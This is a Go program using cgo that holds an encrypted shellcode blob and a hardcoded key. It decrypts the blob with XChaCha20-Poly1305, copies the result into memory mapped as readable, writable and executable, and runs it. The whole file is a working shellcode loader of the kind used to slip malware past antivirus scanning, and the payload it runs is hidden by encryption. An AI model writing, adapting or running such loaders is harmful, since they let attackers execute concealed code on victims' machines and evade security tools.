package main

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

void execute(char *shellcode, size_t length) {
  unsigned char *sc_ptr;
  sc_ptr = (unsigned char *) mmap(0, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  memcpy(sc_ptr, shellcode, length);
  (*(void(*) ()) sc_ptr)();
}
*/
import "C"

import (
	"fmt"
	"unsafe"

	"golang.org/x/crypto/chacha20poly1305"
)

func main() {
	key := []byte{
		0x17, 0x10, 0x43, 0x7b, 0x7f, 0xb1, 0x2a, 0x8a, 0xdb, 0x68, 0x87, 0x66,
		0xc9, 0x89, 0x57, 0xd9, 0x95, 0x9d, 0xd7, 0x65, 0x92, 0x11, 0xa2, 0x87,
		0x94, 0xbe, 0xb2, 0x1b, 0xaf, 0x5a, 0xfc, 0x5e,
	}
	scBuf := []byte{
		0xc4, 0xdc, 0xd5, 0x72, 0xdd, 0xec, 0x03, 0xbc, 0x45, 0xb5, 0xa5, 0x98,
		0x9e, 0x69, 0x46, 0x20, 0xd6, 0x63, 0x63, 0xb6, 0x06, 0x26, 0x57, 0x02,
		0x42, 0x3e, 0xb0, 0xc9, 0x7d, 0x3a, 0xa1, 0x4f, 0xfa, 0x23, 0xb7, 0x5a,
		0x23, 0x35, 0xdf, 0x72, 0xf0, 0x04, 0x36, 0x8d, 0xdd, 0xa1, 0xd5, 0x9b,
		0x15, 0xce, 0x8f, 0xb5, 0xcf, 0x25, 0x0f, 0xcc, 0x01, 0x53, 0x4b, 0x4e,
		0x59, 0xda, 0x87, 0x2f, 0xe5, 0xe9, 0x1b, 0x43, 0x58, 0xec, 0x69, 0x36,
		0x07, 0x2b, 0x62, 0xd7, 0x19, 0xd9, 0x87, 0x01, 0x73, 0x89, 0xe6, 0xff,
		0xfe, 0x4e, 0x0d, 0x83, 0xc6, 0x61, 0xde, 0x8f, 0xdf, 0x0f, 0x28, 0xb5,
		0x2f, 0x03, 0xd8, 0x2f, 0x8e, 0xb3, 0x0f, 0xb5, 0x9a, 0x50, 0x75, 0x8b,
	}

	aead, err := chacha20poly1305.NewX(key)
	if err != nil {
		panic(err)
	}

	if len(scBuf) < aead.NonceSize() {
		panic("[!] ERROR. Chiphertext too short")
	}

	// Split nonce and ciphertext.
	nonce, ciphertext := scBuf[:aead.NonceSize()], scBuf[aead.NonceSize():]

	// Decryption
	fmt.Println("[+] Decrypting shellcode ...")
	shellcode, err := aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err)
	}

	fmt.Println("[+] Running shellcode ...")
	C.execute((*C.char)(unsafe.Pointer(&shellcode[0])), (C.size_t)(len(shellcode)))
}
